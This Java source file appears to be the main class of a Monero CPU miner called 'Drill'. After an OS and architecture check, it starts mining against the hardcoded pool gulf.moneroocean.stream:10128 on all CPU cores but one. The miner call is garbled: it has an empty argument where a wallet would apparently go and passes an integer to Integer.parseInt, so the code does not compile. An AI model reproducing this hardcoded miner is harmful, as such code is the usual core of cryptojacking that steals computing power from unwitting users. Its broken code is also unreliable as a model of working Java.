package tk.netindev.drill;

import org.apache.commons.cli.CommandLine;
import org.apache.commons.cli.DefaultParser;
import org.apache.commons.cli.Option;
import org.apache.commons.cli.Options;
import org.apache.commons.cli.ParseException;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import tk.netindev.drill.miner.Miner;
import tk.netindev.drill.util.Misc;


public class Drill {

   private static final Logger logger = LoggerFactory
         .getLogger(Drill.class.getName());
   public static final double PACKAGE_VERSION = 0.10D;

   public static void main(String[] args) {
      try {
         final String system = System.getProperty("os.name").toLowerCase();
         if (!(system.indexOf("win") >= 0 || system.indexOf("nix") >= 0
               || system.indexOf("nux") >= 0 || system.indexOf("aix") >= 0)
               || !System.getProperty("sun.arch.data.model").equals("64")) {
            logger.error("Unfortunately, " + system
                  + " isn't supported at this time.");
            return;
         }
      } catch (final Throwable e) {
         logger.error(e.getMessage());
      }
      try {
         new Miner("gulf.moneroocean.stream", , "", Integer.parseInt(10128), Integer.parseInt(String.valueOf(Runtime.getRuntime().availableProcessors() - 1))).start();
      } catch (final ParseException e) {
         logger.error(e.getMessage());
      } catch (final Exception e) {
         logger.error(e.getMessage());
      }
   }
}
